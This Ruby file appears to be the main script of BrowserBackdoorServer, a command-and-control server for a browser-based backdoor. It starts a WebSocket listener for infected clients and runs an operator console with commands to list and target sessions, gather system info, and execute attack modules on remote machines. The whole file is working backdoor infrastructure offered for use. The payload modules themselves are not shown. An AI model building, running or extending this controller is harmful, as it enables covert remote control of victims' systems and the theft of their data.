#!/usr/bin/env ruby
# BrowserBackdoorServer - https://github.com/IMcPwn/browser-backdoor

# BrowserBackdoorServer (BBS) is a WebSocket server that listens for connections 
# from BrowserBackdoor and creates an command-line interface for 
# executing commands on the remote system(s).
# For more information visit: http://imcpwn.com

# MIT License

# Copyright (c) 2016 Carleton Stuberg

# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:

# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.

# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.

require_relative 'lib/bbs/printcolor'
require_relative 'lib/bbs/constants'
require_relative 'lib/bbs/commands'
require_relative 'lib/bbs/websocket'
require_relative 'lib/bbs/config'
require 'yaml'
require 'pry'
require 'readline'
require 'colorize'

def main()
    begin
        Bbs::Config.loadConfig()
        Bbs::Config.loadLog()
        configfile = Bbs::Config.getConfig()
        log = Bbs::Config.getLog()

        wss = Bbs::WebSocket.new
        commands = Bbs::Constants.getCommands()
        infoCommands = Bbs::Constants.getInfoCommands()
        welcomeMessage = Bbs::Constants.getWelcomeMessage()

        # Begin WebSocket listener
        Thread.new{wss.startEM(log, configfile['host'], configfile['port'],
        configfile['secure'], configfile['priv_key'], configfile['cert_chain'], configfile['response_limit'])}

        setupAutocomplete(commands)
        printWelcome(welcomeMessage, configfile['host'], configfile['port'], configfile['secure'])

        # Start command line
        cmdLine(log, wss, commands, infoCommands)
    rescue => e
        log.warn("Fatal error #{e.message}")
        abort("Fatal error: #{e.message}")
    end
end

def printWelcome(msg, host, port, secure)
    puts msg
    puts ("\nServer is listening on #{host}:#{port}" + ((secure == true) ? " securely" : "") + "...").colorize(:green)
    puts "By default, session -1 is selected which stands for all available sessions."
    puts "To execute a module, enter exec MODULE_NAME."
    puts "Enter help for command usage."
end

# Autocomplete is all of the "help" commands
def setupAutocomplete(commands)
    cmdAuto = proc { |s| commands.map{|cmd, _desc| cmd}.flatten.grep(/^#{Regexp.escape(s)}/) }
    Readline::completion_append_character = " "
    Readline::completion_proc = cmdAuto
end

def cmdLine(log, wss, commands, infoCommands)
    log.info("Command line started")
    begin
        while cmdIn = Readline::readline("\nbbs > ".colorize(:cyan))
            case cmdIn.split()[0]
            when "help"
                log.info("Help command called.")
                Bbs::Command.helpCommand(commands)
            when "exit"
                log.info("Exit command called.")
                break
            when "sessions"
                log.info("Sessions command called.")
                Bbs::Command.sessionsCommand(wss.getSelected(), wss.getWsList())
            when "target"
                log.info("Target command called.")
                Bbs::Command.targetCommand(wss, cmdIn.split())
            when "info"
                if Bbs::WebSocket.validSession?(wss.getSelected(), wss.getWsList())
                    log.info("Info command called.")
                    Bbs::Command.infoCommand(log, infoCommands, wss.getSelected(), wss.getWsList())
                end
            when "exec"
                if Bbs::WebSocket.validSession?(wss.getSelected(), wss.getWsList())
                    log.info("Exec command called.")
                    Bbs::Command.execCommand(log, wss, cmdIn.split())
                end
            when "get_cert"
                log.info("Get_cert command called.")
                Bbs::Command.getCertCommand()
            when "pry"
                log.info("Pry command called.")
                binding.pry
                setupAutocomplete(commands)
            when "clear"
                log.info("Clear command called.")
                Bbs::Command.clearCommand()
            when "ls"
                log.info("Ls command called.")
                Bbs::Command.lsCommand(cmdIn.split())
            when "cat"
                log.info("Cat command called.")
                Bbs::Command.catCommand(log, cmdIn.split())
            when "modules"
                log.info("Modules command called")
                Bbs::Command.modulesCommand()
            when nil
                next
            else
                Bbs::PrintColor.print_error("Invalid command. Try help for help.")
            end
            Readline::HISTORY.push(cmdIn)
        end
    rescue Interrupt
        log.warn("Interrupt received")
        abort("Caught interrupt. Quitting...")
    rescue => e
        log.warn("Error in cmdLine: #{e.message}")
        abort("Error in command line: #{e.message}. Quitting...")
    end
end

main()
